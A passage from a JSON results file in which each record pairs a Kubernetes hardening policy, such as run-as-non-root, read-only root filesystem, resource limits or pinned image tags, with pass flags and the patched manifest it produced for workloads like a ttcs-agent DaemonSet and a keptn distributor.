    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01109",
    "policy_id": "no_privileged",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01110",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          runAsNonRoot: true\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01111",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01112",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:stable\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01113",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cli\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cli\n  template:\n    metadata:\n      labels:\n        app: cli\n    spec:\n      containers:\n      - name: cli\n        image: target/consensource-cli:stable\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 50m\n            memory: 100Mi\n          requests:\n            cpu: 20m\n            memory: 50Mi\n        command:\n        - bash\n        args:\n        - -c\n        - 'tail -f /dev/null\n\n          '\n        volumeMounts:\n        - name: consensource-keys\n          mountPath: /root/.sawtooth\n          readOnly: true\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: consensource-keys\n        secret:\n          secretName: cli\n          items:\n          - key: sawtooth-pub-key\n            path: keys/root.pub\n          - key: sawtooth-priv-key\n            path: keys/root.priv\n",
    "errors": []
  },
  {
    "id": "01114",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cli\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cli\n  template:\n    metadata:\n      labels:\n        app: cli\n    spec:\n      containers:\n      - name: cli\n        image: target/consensource-cli:stable\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 50m\n            memory: 100Mi\n          requests:\n            cpu: 20m\n            memory: 50Mi\n        command:\n        - bash\n        args:\n        - -c\n        - 'tail -f /dev/null\n\n          '\n        volumeMounts:\n        - name: consensource-keys\n          mountPath: /root/.sawtooth\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: consensource-keys\n        secret:\n          secretName: cli\n          items:\n          - key: sawtooth-pub-key\n            path: keys/root.pub\n          - key: sawtooth-priv-key\n            path: keys/root.priv\n",
    "errors": []
  },
  {
    "id": "01115",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cli\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cli\n  template:\n    metadata:\n      labels:\n        app: cli\n    spec:\n      containers:\n      - name: cli\n        image: target/consensource-cli:stable\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 50m\n            memory: 100Mi\n          requests:\n            cpu: 20m\n            memory: 50Mi\n        command:\n        - bash\n        args:\n        - -c\n        - 'tail -f /dev/null\n\n          '\n        volumeMounts:\n        - name: consensource-keys\n          mountPath: /root/.sawtooth\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: consensource-keys\n        secret:\n          secretName: cli\n          items:\n          - key: sawtooth-pub-key\n            path: keys/root.pub\n          - key: sawtooth-priv-key\n            path: keys/root.priv\n",
    "errors": []
  },
  {
    "id": "01116",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: keda-olm-operator\n  template:\n    metadata:\n      labels:\n        name: keda-olm-operator\n    spec:\n      serviceAccountName: keda-olm-operator\n      containers:\n      - name: keda-olm-operator\n        image: ghcr.io/kedacore/keda-olm-operator:main\n        command:\n        - /manager\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01117",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: keda-olm-operator\n  template:\n    metadata:\n      labels:\n        name: keda-olm-operator\n    spec:\n      serviceAccountName: keda-olm-operator\n      containers:\n      - name: keda-olm-operator\n        image: ghcr.io/kedacore/keda-olm-operator:main\n        command:\n        - /manager\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01118",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-datastore-distributor\n  namespace: keptn-datastore\nspec:\n  selector:\n    matchLabels:\n      run: distributor\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        run: distributor\n    spec:\n      containers:\n      - name: distributor\n        image: keptn/distributor:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            memory: 32Mi\n            cpu: 50m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: PUBSUB_IMPL\n          value: nats\n        - name: PUBSUB_URL\n          value: nats://keptn-nats-cluster.keptn.svc.cluster.local\n        - name: PUBSUB_TOPIC\n          value: sh.keptn.>\n        - name: PUBSUB_RECIPIENT\n          value: mongodb-datastore\n        - name: PUBSUB_RECIPIENT_PATH\n          value: /event\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: keptn-ds-default\n",
    "errors": []
  },
  {
    "id": "01119",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-datastore-distributor\n  namespace: keptn-datastore\nspec:\n  selector:\n    matchLabels:\n      run: distributor\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        run: distributor\n    spec:\n      containers:\n      - name: distributor\n        image: keptn/distributor:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            memory: 32Mi\n            cpu: 50m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: PUBSUB_IMPL\n          value: nats\n        - name: PUBSUB_URL\n          value: nats://keptn-nats-cluster.keptn.svc.cluster.local\n        - name: PUBSUB_TOPIC\n          value: sh.keptn.>\n        - name: PUBSUB_RECIPIENT\n          value: mongodb-datastore\n        - name: PUBSUB_RECIPIENT_PATH\n          value: /event\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      serviceAccountName: keptn-ds-default\n",
    "errors": []
  },
  {
    "id": "01120",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-datastore-distributor\n  namespace: keptn-datastore\nspec:\n  selector:\n    matchLabels:\n      run: distributor\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        run: distributor\n    spec:\n      containers:\n      - name: distributor\n        image: keptn/distributor:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            memory: 32Mi\n            cpu: 50m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: PUBSUB_IMPL\n          value: nats\n        - name: PUBSUB_URL\n          value: nats://keptn-nats-cluster.keptn.svc.cluster.local\n        - name: PUBSUB_TOPIC\n          value: sh.keptn.>\n        - name: PUBSUB_RECIPIENT\n          value: mongodb-datastore\n        - name: PUBSUB_RECIPIENT_PATH\n          value: /event\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      serviceAccountName: keptn-ds-default\n",
    "errors": []
  },
  {
    "id": "01121",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01122",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01123",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01124",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01125",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01126",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:stable\n        ports:\n        - containerPort: 8081\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01127",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:stable\n        ports:\n        - containerPort: 8081\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01128",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:stable\n        ports:\n        - containerPort: 8081\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01129",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:stable\n        ports:\n        - containerPort: 8081\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01130",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:stable\n        ports:\n        - containerPort: 8081\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01131",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01132",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01133",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
